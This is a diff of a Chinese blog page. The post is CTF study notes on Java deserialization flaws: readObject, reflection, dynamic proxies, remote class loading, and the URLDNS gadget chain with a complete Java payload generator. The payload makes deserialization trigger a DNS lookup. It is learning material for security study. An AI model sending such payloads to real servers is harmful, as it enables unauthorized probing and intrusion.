@@ -16,16 +16,16 @@
   <meta name="author" content="D0G">
   <meta name="keywords" content="">
   
-    <meta name="description" content="反序列化回顾URLDNS利用链 1234561. HashMap-&gt;readObject()2. HashMap-&gt;hash()3. URL-&gt;hashCode()4. URLStreamHandler-&gt;hashCode()5. URLStreamHandler-&gt;getHostAddress()6. InetAddress-&gt;getByName()    D">
+    <meta name="description" content="JAVA反序列化基础java对象 &lt;—&gt; 字节码  序列化反序列化 需要有一个serializable的接口 不需要实现 需要有  可以用fileOutputStream fileInputStream transient 标记的对象不会被 序列化  如果重写了writeObject 或者 readObject 就会调用自己的 不会用原生的  漏洞成因如果接受了一个类 反序列化后里面有">
 <meta property="og:type" content="article">
-<meta property="og:title" content="javaserializa">
-<meta property="og:url" content="https://blog.cgjue.cn/2024/06/21/javaserializa/index.html">
+<meta property="og:title" content="java反序列化">
+<meta property="og:url" content="https://blog.cgjue.cn/2024/03/18/javaserializa/index.html">
 <meta property="og:site_name" content="云自无心水自闲">
-<meta property="og:description" content="反序列化回顾URLDNS利用链 1234561. HashMap-&gt;readObject()2. HashMap-&gt;hash()3. URL-&gt;hashCode()4. URLStreamHandler-&gt;hashCode()5. URLStreamHandler-&gt;getHostAddress()6. InetAddress-&gt;getByName()    D">
+<meta property="og:description" content="JAVA反序列化基础java对象 &lt;—&gt; 字节码  序列化反序列化 需要有一个serializable的接口 不需要实现 需要有  可以用fileOutputStream fileInputStream transient 标记的对象不会被 序列化  如果重写了writeObject 或者 readObject 就会调用自己的 不会用原生的  漏洞成因如果接受了一个类 反序列化后里面有">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.cgjue.cn/img/ctfer8.jpg#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
-<meta property="article:published_time" content="2024-06-21T10:31:37.000Z">
-<meta property="article:modified_time" content="2024-06-21T13:25:45.951Z">
+<meta property="article:published_time" content="2024-03-18T10:31:37.000Z">
+<meta property="article:modified_time" content="2024-06-27T07:24:14.753Z">
 <meta property="article:author" content="D0G">
 <meta property="article:tag" content="study">
 <meta name="twitter:card" content="summary_large_image">
@@ -35,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>javaserializa - 云自无心水自闲</title>
+  <title>java反序列化 - 云自无心水自闲</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -208,7 +208,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="javaserializa"></span>
+            <span id="subtitle" data-typed-text="java反序列化"></span>
           
         </div>
 
@@ -219,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-21 18:31" pubdate>
-          2024年6月21日 晚上
+        <time datetime="2024-03-18 18:31" pubdate>
+          2024年3月18日 晚上
         </time>
       </span>
     
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          2.9k 字
         
       </span>
     
@@ -242,7 +242,7 @@
         
         
         
-          12 分钟
+          25 分钟
         
       </span>
     
@@ -300,18 +300,89 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">javaserializa</h1>
+            <h1 id="seo-header">java反序列化</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="反序列化回顾"><a href="#反序列化回顾" class="headerlink" title="反序列化回顾"></a>反序列化回顾</h1><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>利用链</p>
+                <h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>java对象 &lt;—&gt; 字节码 </p>
+<h3 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h3><ol>
+<li>需要有一个serializable的接口 不需要实现 需要有</li>
+</ol>
+<p>可以用fileOutputStream fileInputStream</p>
+<p>transient 标记的对象不会被 序列化</p>
+<blockquote>
+<p>如果重写了writeObject 或者 readObject 就会调用自己的 不会用原生的</p>
+</blockquote>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><strong>如果接受了一个类 反序列化后里面有readObject类 就会自动调用</strong></p>
+<p> <strong>传到服务器上的代码 如果反序列化了 就会直接执行代码</strong></p>
+<ol>
+<li>入口类readObject 直接调用危险方法</li>
+<li>入口类参数中包含可控类 这个类有危险方法 readObject时调用</li>
+<li>可控类套可控类 直到一个类存在危险方法 readObject时调用</li>
+<li>构造函数&#x2F;静态代码块 等类加载时隐式执行</li>
+</ol>
+<h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><ol>
+<li>继承 serializable</li>
+<li>入口类 （重写readObject 参数类型宽泛 最好是jdk自带  也就是 HashMap</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144#heading-5">HashMap为什么要重写writeObject 和readObject</a></p>
+<ol start="3">
+<li>调用链 相同名称 相同类型</li>
+<li>执行类</li>
+</ol>
+<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>让java具有动态性</p>
+<p>修改 已经存在的对象的属性</p>
+<p>动态生成对象</p>
+<p>动态调用方法</p>
+<p>操作内部类 和私有方法 xxx.setAccessible(true)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//调用类里面的方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">xxx</span> <span class="hljs-operator">=</span> 类名.getMethod(<span class="hljs-string">&quot;方法名&quot;</span>,函数类型)<span class="hljs-comment">//私有的用getDeclaredMethod 加上修改权限xxx.setAccessible(true)</span><br>xxx.invoke(实例化对象,value)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="在反序列化中的使用"><a href="#在反序列化中的使用" class="headerlink" title="在反序列化中的使用"></a>在反序列化中的使用</h3><p>定制需要的对象</p>
+<p>通过invoke调用除了同名函数以外的函数</p>
+<p>通过Class类创建对象 引入不能序列化的类</p>
+<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p>可以知道getRuntime 没有继承serializable是不能被反序列化的</p>
+<p>为什么在反序列化中用它呢</p>
+<p>具体利用是</p>
+<blockquote>
+<p>找到某个invoke方法 它会以getRuntime 作为参数</p>
+</blockquote>
+<p>从而动态调用getRuntime实现反序列化</p>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><blockquote>
+<p>不修改原对象 通过代理类扩展一些功能</p>
+</blockquote>
+<p><del>静态 没什么可写的</del></p>
+<p>要代理的接口 需要做的(调用处理器) 类加载CalssLoader</p>
+<p>在反序列化中的运用</p>
+<p>和readObject类似 -&gt; 反序列化自动执行</p>
+<p>invoke -&gt; 有函数时调用</p>
+<p>可以拼接两条链 无论前面是什么链 后面都会固定</p>
+<h2 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h2><p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
+<p>localClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p>
+<p>URlClassLoader 任意类加载 file&#x2F;http&#x2F;jar 协议</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://localhost:9999/Hello.jar!/&quot;</span>)&#125;);<br>CLass&lt;?&gt; c = urlClassLoader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>c.newInstance<span class="hljs-comment">//ClassLoader.defineClass 不会直接初始化</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>ClassLoader.defineClass 字节码加载任意类 私有</p>
+<p>Unsafe.defineClass 字节码加载public 类不能直接生成 Spring 里面可以直接生成</p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>利用链</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-number">1</span>. HashMap-&gt;<span class="hljs-function"><span class="hljs-title">readObject</span>()</span><br><span class="hljs-number">2</span>. HashMap-&gt;<span class="hljs-function"><span class="hljs-title">hash</span>()</span><br><span class="hljs-number">3</span>. URL-&gt;<span class="hljs-function"><span class="hljs-title">hashCode</span>()</span><br><span class="hljs-number">4</span>. URLStreamHandler-&gt;<span class="hljs-function"><span class="hljs-title">hashCode</span>()</span><br><span class="hljs-number">5</span>. URLStreamHandler-&gt;<span class="hljs-function"><span class="hljs-title">getHostAddress</span>()</span><br><span class="hljs-number">6</span>. InetAddress-&gt;<span class="hljs-function"><span class="hljs-title">getByName</span>()</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p>Demo UrlDns.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.urldns;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//Person person = new Person(&quot;username&quot;,11);</span><br>        <span class="hljs-comment">//System.out.println(person);</span><br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//这里不要发起请求，把url对象的hashcode改成不是-1</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;xxx.xxx.xxx&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url, <span class="hljs-number">123</span>);<br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashcodefield.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br><span class="hljs-comment">//        unserialize(&quot;ser-urldns.bin&quot;);</span><br>    &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser-urldns.bin&quot;</span>));<br>            objectOutputStream.writeObject(obj);<br>        &#125;<br>        <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><strong>UrlDns.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.urldns;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        <br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<span class="hljs-comment">//private类 反射调用修改</span><br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//设置为可修改bian&#x27;chen</span><br>        hashcodefield.set(url, <span class="hljs-number">123</span>); <span class="hljs-comment">//这里不要发起请求，把url对象的hashcode改成不是-1</span><br>        hashMap.put(url, <span class="hljs-number">1</span>);<span class="hljs-comment">//给map赋值的时候用到了put方法 也会走一遍hashcode  </span><br>        <span class="hljs-comment">//导致hashcode不为-1 变成了url的hashcode</span><br>        hashcodefield.set(url, -<span class="hljs-number">1</span>);<span class="hljs-comment">//再反射赋值为-1</span><br>        serialize(hashMap);<br><span class="hljs-comment">//        unserialize(&quot;ser-urldns.bin&quot;); //反序列化利用</span><br>    &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser-urldns.bin&quot;</span>));<br>            objectOutputStream.writeObject(obj);<br>        &#125;<br>        <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+
                 
               </div>
             
@@ -329,13 +400,27 @@
     
       <span class="category-chain">
         
-  <a href="/categories/STUDY/" class="category-chain-item">STUDY</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
   
     <span>></span>
     
-  <a href="/categories/STUDY/AllInOne/" class="category-chain-item">AllInOne</a>
+  <a href="/categories/CTF/STUDY/" class="category-chain-item">STUDY</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/STUDY/WEB/" class="category-chain-item">WEB</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/STUDY/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">反序列化</a>
+  
+  
+
+  
+
   
 
   
@@ -360,6 +445,29 @@
 
               
 
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/21/pwn/" title="ROP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ROP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/13/Beautify-Shell/" title="终端美化">
+                        <span class="hidden-mobile">终端美化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
               
             </div>
 
